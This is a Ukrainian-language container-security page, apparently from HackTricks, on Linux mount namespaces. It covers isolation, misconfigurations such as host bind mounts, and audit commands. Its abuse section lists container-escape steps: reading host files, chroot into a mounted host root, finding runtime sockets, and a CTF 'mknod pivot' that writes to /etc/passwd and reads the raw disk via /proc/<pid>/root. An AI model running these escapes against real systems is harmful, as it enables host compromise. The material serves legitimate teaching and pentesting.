# Простір імен монтувань

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен монтувань керує **таблицею монтувань**, яку бачить процес. Це одна з найважливіших функцій ізоляції контейнера, оскільки коренева файлова система, bind mounts, tmpfs mounts, procfs view, sysfs exposure, та багато runtime-specific helper mounts усі виражаються через цю таблицю монтувань. Два процеси можуть обидва звертатися до `/`, `/proc`, `/sys` або `/tmp`, але до чого ці шляхи резольвуються, залежить від простору імен монтувань, в якому вони знаходяться.

З точки зору безпеки контейнерів, простір імен монтувань часто визначає різницю між «це акуратно підготовлена файлова система додатка» і «цей процес може безпосередньо бачити або впливати на файлову систему хоста». Саме тому bind mounts, `hostPath` volumes, privileged mount operations, and writable `/proc` or `/sys` exposures все пов'язані з цим простором імен.

## Принцип роботи

Коли середовище виконання запускає контейнер, воно зазвичай створює новий простір імен монтувань, готує кореневу файлову систему для контейнера, монтує procfs та інші допоміжні файлові системи за потреби, а потім опційно додає bind mounts, tmpfs mounts, secrets, config maps або host paths. Після того як цей процес працює всередині простору імен, набір монтувань, який він бачить, здебільшого відокремлений від стандартного вигляду на хості. Хост може все ще бачити реальну підлягаючу файлову систему, але контейнер бачить версію, зібрану для нього середовищем виконання.

Це потужно, бо дозволяє контейнеру вважати, що в нього є власна коренева файлова система, хоча хост все одно керує всім. Це також небезпечно, тому що якщо середовище виконання виставить невірний mount, процес раптово отримує видимість ресурсів хоста, які решта моделі безпеки могла й не передбачати для захисту.

## Лабораторія

Ви можете створити приватний простір імен монтувань за допомогою:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Якщо відкрити інший shell поза цим namespace і переглянути mount table, ви побачите, що tmpfs mount існує лише всередині ізольованого mount namespace. Це корисна вправа, бо вона показує, що ізоляція монтувань — не абстрактна теорія; ядро буквально подає процесу іншу mount table.

Якщо відкрити інший shell поза цим namespace і переглянути mount table, tmpfs mount буде існувати тільки всередині ізольованого mount namespace.

Всередині контейнерів коротке порівняння виглядає так:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Другий приклад демонструє, наскільки легко конфігурація часу виконання може пробити велику діру в межі файлової системи.

## Використання під час виконання

Docker, Podman, стек на основі containerd та CRI-O покладаються на приватний mount namespace для звичайних контейнерів. Kubernetes будує на тому ж механізмі для volumes, projected secrets, config maps і `hostPath` mounts. Incus/LXC environments також сильно покладаються на mount namespaces, особливо тому, що system containers часто експонують більш багаті й більш машиноподібні файлові системи, ніж application containers.

Це означає, що коли ви розглядаєте проблему файлової системи контейнера, ви зазвичай не дивитесь на ізольовану особливість Docker. Ви дивитесь на проблему mount-namespace і конфігурації часу виконання, виражену через ту платформу, яка запустила робоче навантаження.

## Неправильні конфігурації

Найочевидніша і найнебезпечніша помилка — це експонування кореневої файлової системи хоста або іншого чутливого шляху хоста через bind mount, наприклад `-v /:/host` або записуваний `hostPath` у Kubernetes. В такому випадку питання вже не "can the container somehow escape?" а скоріше "how much useful host content is already directly visible and writable?" Записуваний host bind mount часто перетворює решту експлойту на просте розміщення файлів, chrooting, модифікацію конфігурацій або runtime socket discovery.

Ще одна поширена проблема — експонування `/proc` або `/sys` хоста таким чином, що обходиться безпечніший контейнерний погляд. Ці файлові системи не є звичайними data mounts; вони є інтерфейсами до стану ядра і процесів. Якщо робоче навантаження звертається безпосередньо до версій хоста, багато припущень, на яких базується hardening контейнера, перестають коректно застосовуватись.

Захист від запису теж має значення. read-only root filesystem не магічно захищає контейнер, але він позбавляє велику частину простору для підготовки атакувальника і ускладнює персистенцію, розміщення допоміжних бінарників і підробку конфігурацій. Навпаки, writable root або writable host bind mount дає атакувальнику простір для підготовки наступного кроку.

## Зловживання

Коли mount namespace використано неналежним чином, атакувальники зазвичай роблять одну з чотирьох речей. Вони **читають дані хоста**, які мали залишатися поза контейнером. Вони **модифікують конфігурацію хоста** через записувані bind mounts. Вони **монтують або перемонтовують додаткові ресурси**, якщо capabilities і seccomp це дозволяють. Або вони **отримують доступ до потужних сокетів і runtime state directories**, які дозволяють їм запитувати у container platform більше доступу.

Якщо контейнер вже бачить файлову систему хоста, решта моделі безпеки змінюється негайно.

Коли підозрюєте host bind mount, спочатку перевірте, що доступне і чи це записуване:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Якщо коренева файлова система хоста змонтована в режимі read-write, прямий доступ до хоста часто буває таким простим:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Якщо мета — отримати привілейований runtime-доступ, а не пряме chrooting, перелічіть sockets та runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Якщо `CAP_SYS_ADMIN` присутній, також перевірте, чи можна створювати нові mounts зсередини контейнера:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Повний приклад: Two-Shell `mknod` Pivot

Більш спеціалізований шлях зловживання виникає, коли користувач root у container може створювати block devices, host і container ділять ідентичність користувача корисним чином, і attacker вже має foothold з низькими привілеями на host. У такій ситуації container може створити device node, наприклад `/dev/sda`, і host-користувач з низькими привілеями пізніше може прочитати його через `/proc/<pid>/root/` для відповідного container process.

Всередині container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
З хоста, від імені відповідного користувача з низькими привілеями після визначення PID оболонки контейнера:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
The important lesson is not the exact CTF string search. It is that mount-namespace exposure through `/proc/<pid>/root/` can let a host user reuse container-created device nodes even when cgroup device policy prevented direct use inside the container itself.

## Перевірки

Ці команди показують вигляд файлової системи, в якій фактично знаходиться поточний процес. Мета — виявити монтування, що походять від хоста, доступні для запису чутливі шляхи та все, що виглядає ширше за звичайну root‑файлову систему контейнера додатка.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Що тут цікаво:

- Bind mounts з хоста, особливо `/`, `/proc`, `/sys`, директорії стану runtime або розташування сокетів, мають одразу кидатися в очі.
- Неочікувані монтування з доступом для читання й запису зазвичай важливіші за велику кількість допоміжних монтувань тільки для читання.
- `mountinfo` часто є найкращим місцем, щоб побачити, чи шлях справді походить з хоста, чи overlay-backed.

Ці перевірки встановлюють **які ресурси видимі в цьому namespace**, **які з них походять з хоста**, і **які з них доступні для запису або чутливі з погляду безпеки**.
{{#include ../../../../../banners/hacktricks-training.md}}
